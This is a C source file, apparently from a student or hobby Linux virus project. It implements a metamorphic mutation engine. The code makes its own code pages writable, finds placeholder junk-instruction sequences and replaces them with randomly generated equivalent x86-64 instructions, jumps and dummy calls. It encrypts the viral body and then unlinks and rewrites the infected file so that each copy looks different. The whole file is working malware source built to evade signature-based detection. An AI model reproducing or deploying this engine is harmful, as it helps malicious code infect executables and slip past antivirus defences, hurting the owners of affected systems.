#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>


#include "utils.h"
#include "death.h"
#include "data.h"
#include "syscall.h"

extern void __attribute__((naked)) _start(void);
extern void end(void);
extern int64_t g_key;

#define ABS(x) ((x) < 0 ? -(x) : (x))
#define VIRUS_SIZE (uintptr_t)&end - (uintptr_t)&_start

int __attribute__((section(".text#"))) g_junk_offsets[NB_JUNK_MAX] = {0};
uint8_t __attribute__((section(".text#"))) g_rand[RAND_SIZE] = {0};
uint16_t __attribute__((section(".text#"))) g_ri = 0;

uint8_t ft_nrand(void);

#define RANDOM_CALL jfs.junk_function[ft_nrand()%4]();

#define NB_CALLS 4

typedef void (*junk_function_p) ();

struct junk_function_s {
	junk_function_p junk_function[NB_CALLS];
} jfs __attribute__((section(".text#")));

void junk_death(void) {
	char tmp = 0;
	char a = 0;
	char b = 0;

	tmp = a;
	a = b;
	b = tmp;
}

static int find_pattern(uint8_t *self, size_t offset) {
	return (self[offset] == PUSH_OP &&
			self[offset + 1] == PUSH_RBX &&

			self[offset + 2] == OP_64 &&
			self[offset + 3] == XCHG &&
			self[offset + 4] == RAX_RAX &&

			self[offset + 5] == OP_64 &&
			self[offset + 6] == XCHG &&
			self[offset + 7] == RAX_RAX &&

			self[offset + 8] == OP_64 &&
			self[offset + 9] == XCHG &&
			self[offset + 10] == RAX_RAX &&

			self[offset + 11] == POP_RBX &&
			self[offset + 12] == POP_OP);
}

static void fill_offsets(uint8_t *self, size_t size, int *junk_offsets) {

	int j = 0;
	for (size_t i = 0; i < size - JUNK_LEN; i++) {
		if (find_pattern(self, i) && j < NB_JUNK_MAX) {
			junk_offsets[j] = i;
			j++;
			i += JUNK_LEN;
		}
	}
}

enum e_opcode {

	OPCODE_XCHG  = 0x87,
	OPCODE_MOV   = 0x8B,
	//OPCODE_MOVSX = 0x63,

	OPCODE_ADD_RM_R = 0x01,
	OPCODE_ADD_R_RM = 0x03,

	OPCODE_SUB_RM_R = 0x29,
	OPCODE_SUB_R_RM = 0x2B,

	OPCODE_ADC  = 0x11,
	OPCODE_SBB  = 0x19,
	OPCODE_ADD  = 0x83,

	OPCODE_AND  = 0x21,
	OPCODE_OR   = 0x09,
	OPCODE_XOR  = 0x31,
	OPCODE_TEST = 0x85,
	OPCODE_CMP  = 0x39,

	OPCODE_SHL  = 0xD3,
};

static uint8_t get_random_opcode(uint8_t rand) {
	const uint8_t opcodes[] = {
		OPCODE_XCHG,
		OPCODE_MOV,
		//OPCODE_MOVSX, danger
		OPCODE_ADD_RM_R,
		OPCODE_ADD_R_RM,
		OPCODE_SUB_RM_R,
		OPCODE_SUB_R_RM,
		OPCODE_ADC,
		OPCODE_SBB,
		OPCODE_AND,
		OPCODE_OR,
		OPCODE_XOR,
		OPCODE_TEST,
		OPCODE_CMP,

		OPCODE_SHL,
	};

	return opcodes[rand % (sizeof(opcodes) / sizeof(opcodes[0]))];

}

inline uint8_t ft_nrand(void) {
	uint8_t rand = g_rand[g_ri];
	g_ri = (g_ri + 1 < RAND_SIZE) ? g_ri + 1 : 0;
	return rand;
}

/* {2, 4jmp, 6, 10} */

static void patch_jmp(uint8_t *nop, int *instr_off, int instr_len, int jmp_offset) {

	int dest_i = ft_nrand() % (instr_len + 1);

	if (dest_i < instr_len) {
		*nop = (uint8_t)(instr_off[dest_i] - jmp_offset - 2);
	} else {
		return;
	}
}

//static inline void *get_rip(void) {
//	void *rip;
//	__asm__ __volatile__("lea (%%rip), %0" : "=r"(rip));
//	return rip;
//}

unsigned long get_rip(void)
{
    long ret;
    __asm__ __volatile__ 
    (
        "call get_rip_label    \n"  // Appelle l'étiquette `get_rip_label`, empile l'adresse de retour (RIP)
        ".globl get_rip_label  \n"  // Rend `get_rip_label` accessible globalement (optionnel ici)
        "get_rip_label:        \n"  // Point de retour de l'appel
        "pop %%rax             \n"  // Dépile l'adresse stockée dans la pile (c'était RIP au moment de CALL)
        "mov %%rax, %0" : "=r"(ret) // Stocke cette adresse dans `ret`
    );

    return ret;
}

static void fill_nop(uint8_t *nop, uint8_t reg_1, uint8_t reg_2, int file_off) {

	int nop_size = JUNK_LEN - 4;
	int bytes_len = 0;
	int offset = 0;

	int instr_off[MAX_INSTR];
	int instr_count = 0;

	int jmp_index = -1;

	while (nop_size > 0) {
		bytes_len = (ft_nrand() % 4) + 2;
		//bytes_len = 5;
		if (nop_size < bytes_len) {
			bytes_len = nop_size;
		}

		if (bytes_len == 0) {
			break;
		}


		switch (bytes_len) {
			case 1:
				nop[offset] = 0x90;
				break;
			case 2:
				if (jmp_index == -1 && ft_nrand() % 2 == 0) {
					nop[offset] = 0xEB;
					nop[offset + 1] = 0x00;
					jmp_index = instr_count;
				} else {
					nop[offset] = get_random_opcode(ft_nrand());
					nop[offset + 1] = 0xC0 + reg_2 + (reg_1 << 3);
				}
				break;
			case 3:
				nop[offset] = 0x48;
				nop[offset + 1] = get_random_opcode(ft_nrand());
				nop[offset + 2] = 0xC0 + reg_1 + (reg_2 << 3);
				break;
			case 4:
				nop[offset] = 0x48;
				nop[offset + 1] = 0x8D; // 0x83 also works
				nop[offset + 2] = 0x40 + reg_2;
				nop[offset + 3] = ft_nrand();
				break;
			case 5: 
				{
					nop[offset] = 0xE8;
					int32_t rel_offset = (int32_t)((uintptr_t)junk_death - (uintptr_t)_start);
					rel_offset = rel_offset - (file_off + 0x7 + offset);
					//_printf("rel_offset: %x\n", rel_offset);
					ft_memcpy(nop + offset + 1, &rel_offset, sizeof(int32_t));
					break;
				}

			default:
				break;
		}

		instr_off[instr_count++] = offset;
		offset += bytes_len;
		nop_size -= bytes_len;

	}

	instr_off[instr_count++] = NOPS_LEN;

	if (jmp_index != -1) {
		uint8_t *jmp_val = nop + instr_off[jmp_index] + 1;

		if (jmp_index + 1 < instr_count) {
			patch_jmp(jmp_val, instr_off + jmp_index + 1, instr_count - jmp_index - 1, instr_off[jmp_index]);
		}
	}
}

static void gen_junk(uint8_t *rdm_junk, int file_off) {

	uint8_t reg_1 = 4;
	uint8_t reg_2 = 4;

	/* check is rsp */
	while (reg_1 == 4) reg_1 = ft_nrand() % 8;
	while (reg_2 == 4 || reg_2 == reg_1) reg_2 = ft_nrand() % 8;

	if ((reg_1 == 4) || (reg_2 == 4) || (reg_1 == reg_2)) {
		reg_1 = 0;
		reg_2 = 1;
	}

	JUNK;

	uint8_t push_1 = PUSH_OP + reg_1;
	uint8_t push_2 = PUSH_OP + reg_2;

	uint8_t pop_1 = POP_OP + reg_1;
	uint8_t pop_2 = POP_OP + reg_2;

	uint8_t nop[NOPS_LEN];
	fill_nop(nop, reg_1, reg_2, file_off);

	rdm_junk[0] = push_1;
	rdm_junk[1] = push_2;

	ft_memcpy(rdm_junk + 2, nop, NOPS_LEN);
	//_printf("%x %x %x %x %x %x\n", nop[0], nop[1], nop[2], nop[3], nop[4], nop[5]);

	rdm_junk[JUNK_LEN - 2] = pop_2;
	rdm_junk[JUNK_LEN - 1] = pop_1;

	JUNK;
}

static void replace_nop(uint8_t *self, int *junk_offsets) {

	for (size_t i = 0; i < NB_JUNK_MAX ; i++) {
		/* at this point junk_offsets is filled */
		if (junk_offsets[i] == 0) {
			break;
		}
		uint8_t rdm_junk[JUNK_LEN];
		gen_junk(rdm_junk, junk_offsets[i]);
		ft_memcpy(self + junk_offsets[i], rdm_junk, JUNK_LEN);

	}
}

static int make_writeable(uint8_t *self, size_t size) {
	uintptr_t start = (uintptr_t)self;
	uintptr_t end = start + size;

	JUNK;

	uintptr_t page_start = start & ~(PAGE_SIZE - 1);
	uintptr_t page_end = (end + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1);

	if (mprotect((void *)page_start, page_end - page_start, PROT_READ | PROT_WRITE | PROT_EXEC) == -1) {
		return -1;
	}
	return 0;
}

void prepare_mutate(void) {

	uintptr_t start = (uintptr_t)&_start;

	make_writeable((uint8_t *)start, VIRUS_SIZE);

	getrandom(g_rand, RAND_SIZE, 0);

	jfs.junk_function[0] = junk_death;
	jfs.junk_function[1] = junk_death;
	jfs.junk_function[2] = junk_death;
	jfs.junk_function[3] = junk_death;


	JUNK;

	RANDOM_CALL;

	if (g_junk_offsets[0] != 0)
		return;

	fill_offsets((uint8_t *)start, VIRUS_SIZE, g_junk_offsets);
}

void mutate(void) {

	JUNK;

	uintptr_t start = (uintptr_t)&_start;

	replace_nop((uint8_t *)start, g_junk_offsets);
}

int death(int start_offset, file_t *file) {


	JUNK;

	uint8_t *self = (uint8_t *)file->view.data;
	char *self_name = file->abs_path;
	int fd = -1;

	uint8_t *entry = self + start_offset;

	if (start_offset != 0x1000) 
		encrypt(entry, VIRUS_SIZE, DEFAULT_KEY);


	JUNK;

	replace_nop(entry, g_junk_offsets);

	uintptr_t junk_pos = (uintptr_t)&g_junk_offsets - (uintptr_t)&_start;
	uint8_t *junk = self + junk_pos + start_offset;
	ft_memcpy(junk, g_junk_offsets, sizeof(g_junk_offsets));

	if (start_offset != 0x1000)
		encrypt(entry, VIRUS_SIZE, DEFAULT_KEY);

	if (unlink(self_name) == -1) {
		munmap(self, file->view.size);
		return -1;
	}

	JUNK;

	fd = open(self_name, O_CREAT | O_WRONLY | O_TRUNC, file->mode);
	if (fd == -1)
		return -1;


	if (write(fd, self, file->view.size) == -1) {
		close(fd);
		munmap(self, file->view.size);
		return -1;
	}

	JUNK;

	if (munmap(self, file->view.size) == -1) {
		close(fd);
		return -1;
	}

	close(fd);

	return 0;
}
